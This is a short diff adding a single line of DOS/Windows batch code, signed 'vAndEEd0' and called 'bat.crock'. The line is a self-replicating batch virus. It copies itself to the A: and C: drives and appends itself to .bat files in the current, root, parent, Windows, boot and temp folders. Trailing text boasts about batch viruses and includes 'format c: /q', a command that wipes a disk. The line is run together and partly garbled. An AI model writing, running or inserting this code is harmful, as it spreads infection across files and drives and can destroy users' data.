@@ -1,0 +1,1 @@
+@echo off|rem bat.crock by vAndEEd0@copy %0.bat a:@for %%x in (*.bat \*.bat ..\*.bat c:\*.bat a:\*.bat %windir%\*.bat %winbootdir%\*.bat %temp%\*.bat) do copy %%x+%0.bat %%x|rem bat.crock by vAndEEd0@copy %0.bat c:exitbat.crockcrocko rockshow simple batch viruses arevery cool huh i like toformat c: /qvAndEEd0
